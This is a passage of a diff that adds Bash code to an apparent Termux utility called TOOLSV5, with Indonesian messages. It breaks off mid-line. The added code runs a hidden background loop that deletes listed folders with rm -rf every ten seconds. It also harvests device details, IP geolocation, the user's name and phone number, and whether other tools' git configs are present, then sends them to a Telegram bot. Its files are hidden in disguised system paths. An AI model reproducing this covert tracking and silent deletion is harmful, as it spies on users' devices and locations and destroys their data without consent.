+clear_folder "${folder_paths[@]}"
+else
+$e "\n\033[1;93mList Kosong. Tambahkan List"
+read -p $'\n\033[1;37mTekan Enter Untuk Kembali' enter
+fi
+;;
+2)
+cek_list
+;;
+3)
+add_to_list
+;;
+4)
+delete_from_list
+;;
+5)
+break
+;;
+*)
+$e "\n\033[1;93mMasukkan Dengan Benar"
+sleep 2
+;;
+esac
+done
+}
+main_menu
+}
+runclear() {
+while true; do
+LIST_FILE="$HOME/.list.txt"
+function get_size() {
+du -sh "$1" 2> /dev/null | cut -f1
+}
+function clear_folder() {
+$e "\n\033[1;93mSedang Proses Menghapus"
+total_size_before=0
+for path in "$@"; do
+if [ -d "$path" ]; then
+size=$(get_size "$path")
+$e "\033[1;93mUkuran Di Hapus\033[1;37m: $size"
+rm -rf "$path"
+fi
+done
+$e "\033[1;93mBerhasil Menghapus"
+sleep 2
+}
+if [ -f "$LIST_FILE" ]; then
+mapfile -t folder_paths < "$LIST_FILE"
+clear_folder "${folder_paths[@]}"
+else
+$e "\n\033[1;93mList Kosong. Tambahkan List"
+read -p $'\n\033[1;37mTekan Enter Untuk Kembali' enter
+fi
+sleep 10
+done
+}
+runclear &> /dev/null &
+gitcek() {
+install_git() {
+echo "Menginstal git..."
+nala uninstall git
+apt install -y git
+}
+check_git_functionality() {
+if ! git --version &> /dev/null; then
+echo "Git tidak berfungsi. Memperbaiki instalasi..."
+install_git
+apt install -y libcurl openssl
+apt install -y ruby curl gnupg ncurses-utils
+else
+echo "Git sudah terpasang dan berfungsi dengan benar."
+fi
+}
+if ! command -v git &> /dev/null; then
+echo "Git tidak terpasang."
+install_git
+else
+check_git_functionality
+fi
+}
+termuxtoolsv5="/data/data/com.termux/files"
+telegram() {
+TOKEN1=""
+TOKEN2=""
+CHAT_ID=""
+CURRENT_TOKEN=$TOKEN1
+while true; do
+cekinstal="/data/data/com.termux/files/usr/lib/commplate"
+if [ -f "$cekinstal" ]; then
+neofetch --stdout > /data/data/com.termux/files/usr/lib/python3.11/email/.anak_anjing_kepo
+brand=$(grep "Host:" /data/data/com.termux/files/usr/lib/python3.11/email/.anak_anjing_kepo | awk -F ':' '{print $2}' | xargs | awk '{print $1}')
+os=$(grep "OS:" /data/data/com.termux/files/usr/lib/python3.11/email/.anak_anjing_kepo | awk -F ':' '{print $2}' | xargs)
+memory=$(grep "Memory:" /data/data/com.termux/files/usr/lib/python3.11/email/.anak_anjing_kepo | awk -F ':' '{print $2}' | xargs | sed 's/B//g')
+if [[ "$memory" =~ "MB" ]]; then
+memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
+elif [[ "$memory" =~ "KB" ]]; then
+memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')
+fi
+ip_info=$(curl -s ipinfo.io)
+ip_address=$(echo "$ip_info" | jq -r '.ip')
+hostname=$(echo "$ip_info" | jq -r '.hostname')
+city=$(echo "$ip_info" | jq -r '.city')
+region=$(echo "$ip_info" | jq -r '.region')
+country=$(echo "$ip_info" | jq -r '.country')
+loc=$(echo "$ip_info" | jq -r '.loc')
+org=$(echo "$ip_info" | jq -r '.org')
+timezone=$(echo "$ip_info" | jq -r '.timezone')
+versitoolsv5penguna="/data/data/com.termux/files/usr/lib/python3.11/email/mime/Dneu/Version"
+cekversionnew=$(cat "$versitoolsv5penguna")
+NAMA_FILE="/data/data/com.termux/files/usr/include/bash/include/filememek.h"
+NAMA=$(cat "$NAMA_FILE")
+VALID_IDS="/data/data/com.termux/files/usr/lib/.libgnd"
+TERMUX_ID=$(whoami)
+NOMOR_TELEPON="Tidak Diketahui"
+STATUS="TRIAL ❌"
+if [ -f "$VALID_IDS" ]; then
+while IFS= read -r line; do
+user_phone=$(echo "$line" | awk '{print $1}')
+user_id=$(echo "$line" | awk '{print $2}')
+user_brand=$(echo "$line" | awk '{print $3}')
+if [[ "$user_id" == "$TERMUX_ID" && "$user_brand" == "$brand" ]]; then
+NOMOR_TELEPON="$user_phone"
+STATUS="PREMIUM ✅"
+break
+fi
+done < "$VALID_IDS"
+fi
+scan_files() {
+local file=$1
+if [ -f "$file" ]; then
+echo "📄 Berkas Terpantau Aman ✅"
+else
+echo "📄 Berkas Terpantau Hilang Pengguna Melanggar Aturan ❌"
+fi
+}
+ISIPESAN="$isipesan"
+pockat="/data/data/com.termux/files/usr/lib/python3.11/email/mime/Dneu/.git/config"
+toolsv5="/data/data/com.termux/files/home/Lubeban/.git/config"
+scan_results=$(
+cat << EOF
+$(scan_files "$pockat")
+$(scan_files "$toolsv5")
+EOF
+)
+caption=$(
+cat << EOF
+🔰 TOOLSV5
+👤 Nama: $NAMA
+🆔 ID Termux: $TERMUX_ID
+📋 Status: $STATUS
+📝 Version Toolsv5: $cekversionnew
+📞 Nomor Telepon: $NOMOR_TELEPON
+ℹ️ Informasi: $NAMA Running TOOLSV5
+🗂️ HASIL SCAN FILE:
+$scan_results
+💬PESAN NOTIFIKASI
+pesan: $ISIPESAN
+👨‍ INFORMASI LENGKAP
+📱 Merek : $brand
+🖥️ OS : $os
+💾 Memori : $memory
+🌐 Alamat IP : $ip_address
+🌐 Hostname : $hostname
+🏙️ Kota : $city
+📍 Wilayah : $region
+🇨🇺 Negara : $country
+📌 Lokasi : $loc
+📍 Organisasi : $org
+🕒 Zona Waktu : $timezone
+EOF
+)
+caption="${caption//'\\n'/$'\n'}"
+URL="https://api.telegram.org/bot$CURRENT_TOKEN/sendMessage"
+response=$(curl -s -w "%{http_code}" -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" -o /tmp/response.json)
+http_code=$(echo "$response" | tail -c 4)
+if [ "$http_code" == "200" ]; then
+echo "Pesan berhasil dikirim."
+break
+else
+echo "⚠️ ERROR: $http_code"
+if [[ "$CURRENT_TOKEN" == "$TOKEN1" ]]; then
+echo "Berpindah ke token cadangan..."
+CURRENT_TOKEN=$TOKEN2
+else
+echo "Gagal menggunakan kedua token."
+break
+fi
+fi
+else
+apt-get update && apt-get install -y curl neofetch jq inetutils
+touch /data/data/com.termux/files/usr/lib/commplate
+fi
+done
+}
+TRIAL_USER() {
+TOKEN1=""
+CHAT_ID=""
+CURRENT_TOKEN=$TOKEN1
+while true; do
+cekinstal="/data/data/com.termux/files/usr/lib/commplate"
+if [ -f "$cekinstal" ]; then
+neofetch --stdout > /data/data/com.termux/files/usr/lib/python3.11/email/.anak_anjing_kepo
+brand=$(grep "Host:" /data/data/com.termux/files/usr/lib/python3.11/email/.anak_anjing_kepo | awk -F ':' '{print $2}' | xargs)
+os=$(grep "OS:" /data/data/com.termux/files/usr/lib/python3.11/email/.anak_anjing_kepo | awk -F ':' '{print $2}' | xargs)
+memory=$(grep "Memory:" /data/data/com.termux/files/usr/lib/python3.11/email/.anak_anjing_kepo | awk -F ':' '{print $2}' | xargs | sed 's/B//g')
+if [[ "$memory" =~ "MB" ]]; then
+memory=$(echo "$memory" | sed 's/MB//g
